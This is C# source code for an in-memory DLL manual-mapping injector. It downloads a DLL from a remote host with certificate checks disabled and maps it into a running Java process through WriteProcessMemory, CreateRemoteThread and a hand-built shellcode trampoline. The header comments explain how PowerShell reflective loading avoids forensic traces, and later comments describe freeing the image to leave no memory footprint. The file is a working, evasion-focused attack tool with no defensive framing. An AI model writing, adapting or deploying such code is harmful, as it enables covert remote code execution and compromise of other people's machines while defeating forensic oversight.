// language: C# 10, target: .NET Framework 4.8 / Windows 11
// in-memory PE manual mapper — loaded via PowerShell [Reflection.Assembly]::Load()
// no custom EXE on disk: Prefetch/Amcache/BAM see only powershell.exe (always present)
//
// compile: csc /optimize /target:library /out:injector.dll Injector.cs
// deliver: server hosts injector.dll, PowerShell downloads + loads from memory

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Svc
{
    public class Loader
    {
        const uint PROCESS_ALL_ACCESS = 0x1FFFFF;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint MEM_RELEASE = 0x8000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint PAGE_READWRITE = 0x04;

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr proc, IntPtr addr, uint size, uint type, uint protect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr proc, IntPtr addr, byte[] buf, uint size, out int written);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr proc, IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, out int tid);

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr handle, uint ms);

        [DllImport("kernel32.dll")]
        static extern bool VirtualFreeEx(IntPtr proc, IntPtr addr, uint size, uint type);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string name);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        static extern IntPtr GetProcAddress(IntPtr module, string name);

        // PE structures
        static ushort ReadU16(byte[] b, int o) => BitConverter.ToUInt16(b, o);
        static uint ReadU32(byte[] b, int o) => BitConverter.ToUInt32(b, o);
        static ulong ReadU64(byte[] b, int o) => BitConverter.ToUInt64(b, o);
        static void WriteU64(byte[] b, int o, ulong v) { BitConverter.GetBytes(v).CopyTo(b, o); }

        public static int Run(string host, int port)
        {
            ServicePointManager.ServerCertificateValidationCallback = (s, c, ch, e) => true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            // download DLL bytes
            byte[] dll;
            try
            {
                using (var wc = new WebClient())
                    dll = wc.DownloadData($"https://{host}:{port}/loader.dll");
            }
            catch { return 1; }

            if (dll.Length < 64) return 1;

            // validate PE
            if (ReadU16(dll, 0) != 0x5A4D) return 1; // MZ
            int lfanew = (int)ReadU32(dll, 0x3C);
            if (ReadU32(dll, lfanew) != 0x4550) return 1; // PE\0\0

            // find target process
            int pid = FindJava();
            if (pid == 0) return 1;

            IntPtr proc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            if (proc == IntPtr.Zero) return 1;

            int result = InjectManualMap(proc, dll, lfanew);
            Array.Clear(dll, 0, dll.Length);

            // proc handle is closed by the deferred cleanup thread inside InjectManualMap
            // if injection failed, close it here
            if (result != 0) CloseHandle(proc);
            return result;
        }

        static int InjectManualMap(IntPtr proc, byte[] dll, int lfanew)
        {
            // NT headers offsets (PE32+)
            int optOff = lfanew + 24;
            uint sizeOfImage = ReadU32(dll, optOff + 56);
            uint sizeOfHeaders = ReadU32(dll, optOff + 60);
            ulong preferredBase = ReadU64(dll, optOff + 24);
            uint entryRva = ReadU32(dll, optOff + 16);
            int numSections = ReadU16(dll, lfanew + 6);
            int sectionOff = optOff + ReadU16(dll, lfanew + 20);

            // import directory
            uint impRva = ReadU32(dll, optOff + 120 + 8);  // DataDirectory[1].VirtualAddress
            uint impSize = ReadU32(dll, optOff + 120 + 12); // DataDirectory[1].Size

            // relocation directory
            uint relRva = ReadU32(dll, optOff + 120 + 40);  // DataDirectory[5].VirtualAddress
            uint relSize = ReadU32(dll, optOff + 120 + 44);  // DataDirectory[5].Size

            // allocate in target
            IntPtr remoteBase = VirtualAllocEx(proc, IntPtr.Zero, sizeOfImage,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (remoteBase == IntPtr.Zero) return 1;

            ulong actualBase = (ulong)remoteBase.ToInt64();
            long delta = (long)(actualBase - preferredBase);

            // prepare local working copy: copy headers + sections at their virtual addresses
            byte[] image = new byte[sizeOfImage];
            Array.Copy(dll, 0, image, 0, (int)sizeOfHeaders);

            for (int i = 0; i < numSections; i++)
            {
                int sh = sectionOff + i * 40;
                uint virtAddr = ReadU32(dll, sh + 12);
                uint rawSize = ReadU32(dll, sh + 16);
                uint rawPtr = ReadU32(dll, sh + 20);
                if (rawSize > 0 && rawPtr + rawSize <= dll.Length)
                    Array.Copy(dll, (int)rawPtr, image, (int)virtAddr, (int)rawSize);
            }

            // resolve imports from this process (kernel32 is at same base everywhere)
            if (impRva > 0 && impSize > 0)
            {
                int impOff = (int)impRva;
                while (impOff + 20 <= image.Length)
                {
                    uint nameRva = ReadU32(image, impOff + 12);
                    if (nameRva == 0) break;

                    string modName = ReadAscii(image, (int)nameRva);
                    IntPtr mod = GetModuleHandle(modName);
                    if (mod == IntPtr.Zero)
                        mod = LoadLibraryRemote(proc, modName);

                    uint oftRva = ReadU32(image, impOff);
                    uint ftRva = ReadU32(image, impOff + 16);
                    if (oftRva == 0) oftRva = ftRva;

                    int thunk = (int)oftRva;
                    int func = (int)ftRva;

                    while (thunk + 8 <= image.Length)
                    {
                        ulong entry = ReadU64(image, thunk);
                        if (entry == 0) break;

                        IntPtr resolved;
                        if ((entry & 0x8000000000000000UL) != 0)
                        {
                            int ordinal = (int)(entry & 0xFFFF);
                            resolved = GetProcAddress(mod, new string((char)ordinal, 1));
                        }
                        else
                        {
                            int hintNameOff = (int)entry + 2; // skip hint
                            string funcName = ReadAscii(image, hintNameOff);
                            resolved = GetProcAddress(mod, funcName);
                        }

                        WriteU64(image, func, (ulong)resolved.ToInt64());
                        thunk += 8;
                        func += 8;
                    }

                    impOff += 20;
                }
            }

            // apply relocations
            if (relRva > 0 && relSize > 0 && delta != 0)
            {
                int relOff = (int)relRva;
                while (relOff + 8 <= image.Length)
                {
                    uint blockVa = ReadU32(image, relOff);
                    uint blockSize = ReadU32(image, relOff + 4);
                    if (blockVa == 0 || blockSize == 0) break;

                    int count = (int)(blockSize - 8) / 2;
                    for (int i = 0; i < count; i++)
                    {
                        ushort entry = ReadU16(image, relOff + 8 + i * 2);
                        int type = entry >> 12;
                        int offset = entry & 0xFFF;
                        if (type == 10) // IMAGE_REL_BASED_DIR64
                        {
                            int patchOff = (int)blockVa + offset;
                            if (patchOff + 8 <= image.Length)
                            {
                                ulong val = ReadU64(image, patchOff);
                                WriteU64(image, patchOff, (ulong)((long)val + delta));
                            }
                        }
                    }

                    relOff += (int)blockSize;
                }
            }

            // write image to target
            int written;
            WriteProcessMemory(proc, remoteBase, image, sizeOfImage, out written);
            Array.Clear(image, 0, image.Length);

            // trampoline: calls DllMain(image_base, DLL_PROCESS_ATTACH, 0x4D4D)
            // 0x4D4D signals manual-mapped to the DLL
            IntPtr entryAddr = new IntPtr((long)actualBase + entryRva);
            byte[] trampoline = BuildTrampoline(actualBase, (ulong)entryAddr.ToInt64());

            IntPtr remoteTramp = VirtualAllocEx(proc, IntPtr.Zero, (uint)trampoline.Length,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            WriteProcessMemory(proc, remoteTramp, trampoline, (uint)trampoline.Length, out written);

            // execute
            int tid;
            IntPtr thread = CreateRemoteThread(proc, IntPtr.Zero, 0, remoteTramp, IntPtr.Zero, 0, out tid);
            if (thread != IntPtr.Zero)
            {
                WaitForSingleObject(thread, 10000);
                CloseHandle(thread);
            }

            // cleanup trampoline
            VirtualFreeEx(proc, remoteTramp, 0, MEM_RELEASE);

            // wait for the DLL worker to finish (downloads agent, loads JVM, wipes headers)
            // then free the entire image region — leaves zero memory footprint
            System.Threading.ThreadPool.QueueUserWorkItem(_ =>
            {
                System.Threading.Thread.Sleep(15000);
                VirtualFreeEx(proc, remoteBase, 0, MEM_RELEASE);
                CloseHandle(proc);
            });

            // return immediately — cleanup runs in background
            // caller must keep process alive briefly (PowerShell does by default)
            return 0;
        }

        // x64 trampoline shellcode: mov rcx,imageBase; mov edx,1; mov r8,0x4D4D; mov rax,entry; call rax; ret
        static byte[] BuildTrampoline(ulong imageBase, ulong entry)
        {
            using (var ms = new MemoryStream())
            using (var bw = new BinaryWriter(ms))
            {
                // sub rsp, 0x28 (shadow space + alignment)
                bw.Write(new byte[] { 0x48, 0x83, 0xEC, 0x28 });
                // mov rcx, imageBase (hinstDLL)
                bw.Write(new byte[] { 0x48, 0xB9 }); bw.Write(imageBase);
                // mov edx, 1 (DLL_PROCESS_ATTACH)
                bw.Write(new byte[] { 0xBA, 0x01, 0x00, 0x00, 0x00 });
                // mov r8, 0x4D4D (manual map sentinel)
                bw.Write(new byte[] { 0x49, 0xC7, 0xC0, 0x4D, 0x4D, 0x00, 0x00 });
                // mov rax, entry
                bw.Write(new byte[] { 0x48, 0xB8 }); bw.Write(entry);
                // call rax
                bw.Write(new byte[] { 0xFF, 0xD0 });
                // xor eax, eax
                bw.Write(new byte[] { 0x31, 0xC0 });
                // add rsp, 0x28
                bw.Write(new byte[] { 0x48, 0x83, 0xC4, 0x28 });
                // ret
                bw.Write((byte)0xC3);
                return ms.ToArray();
            }
        }

        static IntPtr LoadLibraryRemote(IntPtr proc, string name)
        {
            // for DLLs not already loaded in this process, load them here
            // kernel32 and common DLLs share the same base across processes
            IntPtr k32 = GetModuleHandle("kernel32.dll");
            IntPtr loadLib = GetProcAddress(k32, "LoadLibraryA");

            byte[] nameBytes = Encoding.ASCII.GetBytes(name + "\0");
            IntPtr remoteName = VirtualAllocEx(proc, IntPtr.Zero, (uint)nameBytes.Length,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            int w;
            WriteProcessMemory(proc, remoteName, nameBytes, (uint)nameBytes.Length, out w);

            int tid;
            IntPtr thread = CreateRemoteThread(proc, IntPtr.Zero, 0, loadLib, remoteName, 0, out tid);
            if (thread != IntPtr.Zero)
            {
                WaitForSingleObject(thread, 5000);
                CloseHandle(thread);
            }

            VirtualFreeEx(proc, remoteName, 0, MEM_RELEASE);

            // now load locally too so we can resolve exports
            return LoadLibrary(name);
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary(string name);

        static int FindJava()
        {
            foreach (var p in Process.GetProcesses())
            {
                try
                {
                    string n = p.ProcessName.ToLower();
                    if (n == "javaw" || n == "java")
                        return p.Id;
                }
                catch { }
            }
            return 0;
        }

        static string ReadAscii(byte[] buf, int off)
        {
            int end = off;
            while (end < buf.Length && buf[end] != 0) end++;
            return Encoding.ASCII.GetString(buf, off, end - off);
        }
    }
}
